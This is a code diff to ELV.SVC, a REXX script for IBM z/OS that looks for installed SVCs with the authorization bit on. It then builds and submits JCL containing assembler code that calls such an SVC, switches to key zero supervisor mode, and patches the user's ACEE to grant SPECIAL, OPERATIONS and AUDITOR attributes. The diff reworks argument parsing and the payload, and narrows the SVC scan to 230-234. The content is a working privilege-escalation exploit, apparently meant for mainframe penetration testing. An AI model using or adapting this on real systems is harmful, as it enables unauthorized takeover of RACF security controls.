@@ -6,8 +6,9 @@
 /*  authorization bit ON.                                                   */  
 /*  Used by some products or admins to easily get high privileges.          */
 /*                                                                          */
-/*  Usage : ex 'ELV.SVC'  List custom SVC calls (>200)                      */
-/*          ex 'ELV.SVC' 'NUM=233 12=C1C1C1C1 DSN=PDS_DSN'                  */
+/*  Usage : ex 'ELV.SVC'  'LIST'                                            */
+/*                        custom SVC calls (>200)                           */
+/*          ex 'ELV.SVC'  'DSN=PDS_DSN NUM=233 12=C1C1C1C1'                 */
 /*                        Grants SPECIAL using SVC 233                      */
 /*                        Before calling SVC 233                            */
 /*                        ELV.SVC puts C1C1C1C1 into register 12            */
@@ -27,30 +28,41 @@
 
 parse arg parm1 "=" value1 parm2 "=" value2 parm3 "=" value3
 
-if (parm1 = "LIST" | parm1 ="") then
+if (translate(parm1) = "LIST") then
   DO
     Call SVC
     exit
   END 
 
-svc_num = value1
-svc_reg = parm2
-svc_reg_v = value2
-dsn = value3
+if parm1 <> "DSN" & parm2 <> "NUM" then do
+    say "Usage: ex 'ELV.SVC' 'LIST' to check for magic SVC"
+    say "       ex 'ELV.SVC' 'DSN=PDS_DSN NUM=233 12=C1C1C1C1'"
+    say "                     places C1C1C1C1 in register 12"
+    say "                     then calls SVC 233 to grand SPECIAL"
+    say "       ex 'ELV.SVC' 'DSN=PDS_DSN NUM=233"
+    exit(-1)
+end
 
-if length(svc_reg_v) <> 8 then
+
+dsn = value1
+svc_num = value2
+svc_reg = parm3
+svc_reg_v = value3
+
+
+if length(svc_reg_v) <> 8 & length(svc_reg_v) <> 0 then
   Do
     say svc_reg_v "value needs to be 4 bytes long in Hex"
     exit
   End
 
-if svc_num > 255 then
+if (svc_num > 255 | length(svc_num) = 0) then
   Do
     say svc_num " svc needs to be between 200 and 255"
     exit
   End
 
-if svc_reg > 16 then
+if svc_reg > 16 & length(svc_reg_v) <> 0 then
   Do
     say svc_reg " register needs to be <= 16"
     exit
@@ -88,7 +100,7 @@ say '     '
 say 'Custom defined SVC:'                                                              
 say '  Num Hex  EP-Addr  AM TYP APF ASF AR NP UP' ,             
       'CNT AUTH-BIT'                                                      
-Do SVCLST = 200 to 255                                                            
+Do SVCLST = 230 to 234                                                            
   SVCTENT  = Storage(D2x(SCVTSVCT+(SVCLST*8)),8)  /* SVC Table Entry */         
   SVCTENTU = Storage(D2x(SCVTSVCR+(SVCLST*24)),24) /* SVC UP TBL ENT */         
   SVCURCNT = C2d(Substr(SVCTENTU,21,2))      /* SVC update count     */         
@@ -285,33 +297,39 @@ launch_payload:
     QUEUE "//C.SYSLIB  DD DSN=SYS1.SISTMAC1,DISP=SHR"
     QUEUE "//          DD DSN=SYS1.MACLIB,DISP=SHR"
     QUEUE "//C.SYSIN   DD *"
-    QUEUE "    CSECT"
-    QUEUE "    AMODE 31"
-    QUEUE "    STM 14,12,12(13)"
-    QUEUE "    BALR 12,0"
-    QUEUE "    USING *,12"
-    QUEUE "    WTO 'CLEAR3'"
-    QUEUE "    L "||svc_reg||",PARAM"
-    QUEUE "    SVC "||svc_num||""
-    QUEUE "    MODESET KEY=ZERO,MODE=SUP"
-    QUEUE "    WTO 'CLEAR4'"
-    QUEUE "    L 5,X'224'  POINTER TO ASCB"
-    QUEUE "    L 5,X'6C'(5)    POINTER TO ASXB"
-    QUEUE "    L 5,X'C8'(5)    POINTER TO ACEE"
-    QUEUE "    NI X'26'(5),X'00'   SPEC ATTR"
-    QUEUE "    WTO 'CLEAR5'"
-    QUEUE "    OI X'26'(5),X'B1'   OPER ATTR"
-    QUEUE "    WTO 'CLEAR6'"
-    QUEUE "    OI X'27'(5),X'80'   ALTER ACCESS"
-    QUEUE "    WTO 'CLEAR7'"
-    QUEUE "    NI X'27'(5),X'00'   TURN OFF NO ACCESS"
-    QUEUE "    WTO 'CLEAR8'"
-    QUEUE "    OI X'27'(5),X'80'   ALTER ACCESS"
-    QUEUE "    WTO 'CLEAR9'"
-    QUEUE "    XR 15,15"
-    QUEUE "    BR 14"
-    QUEUE "PARAM    DC  X'"||svc_reg_v||"'   "
-    QUEUE "    END"
+    QUEUE "       CSECT"
+    QUEUE "       AMODE 31"
+    QUEUE "       STM 14,12,12(13)"
+    QUEUE "       BALR 12,0"
+    QUEUE "       USING *,12"
+    QUEUE "       ST 13,SAVE+4"
+    QUEUE "       LA 13,SAVE"
+    QUEUE "*"
+    if length(svc_reg) <> 0 then
+      Do
+         QUEUE "       L "||svc_reg||",PARAM"
+      End
+    QUEUE "       SVC "||svc_num||""
+    QUEUE "       MODESET KEY=ZERO,MODE=SUP"
+    QUEUE "       L 5,X'224'  POINTER TO ASCB"
+    QUEUE "       L 5,X'6C'(5)        POINTER TO ASXB"
+    QUEUE "       L 5,X'C8'(5)        POINTER TO ACEE"
+    QUEUE "       NI X'26'(5),X'00'"
+    QUEUE "       OI X'26'(5),X'B1'   SPE + OPER + AUDITOR ATTR"
+    QUEUE "       NI X'27'(5),X'00'"
+    QUEUE "       OI X'27'(5),X'80'   ALTER ACCESS"
+    QUEUE "*"
+    QUEUE "       L 13,SAVE+4"
+    QUEUE "       LM 14,12,12(13)"
+    QUEUE "       XR 15,15"
+    QUEUE "       BR 14"
+    QUEUE "*"
+    QUEUE "SAVE   DS 18F"
+    if length(svc_reg) <> 0  then
+      Do
+         QUEUE "PARAM  DC  X'"||svc_reg_v||"'   "
+      End    
+    QUEUE "       END"
     QUEUE "/*"
     QUEUE "//L.SYSLMOD DD DISP=SHR,DSN="||dsn||""
     QUEUE "//L.SYSIN   DD *"
@@ -321,7 +339,7 @@ launch_payload:
     QUEUE "//STEPLIB   DD DSN="||dsn||",DISP=SHR"
     QUEUE "//STEP02 EXEC PGM=IKJEFT01,COND=(0,NE)"
     QUEUE "//SYSTSIN DD *"
-    QUEUE " ALU "||userid()||" SPECIAL"
+    QUEUE " ALU "||userid()||" SPECIAL OPERATIONS"
     QUEUE "/*"
     QUEUE "//SYSIN   DD DUMMY"
     QUEUE "//SYSTSPRT DD SYSOUT=*"    
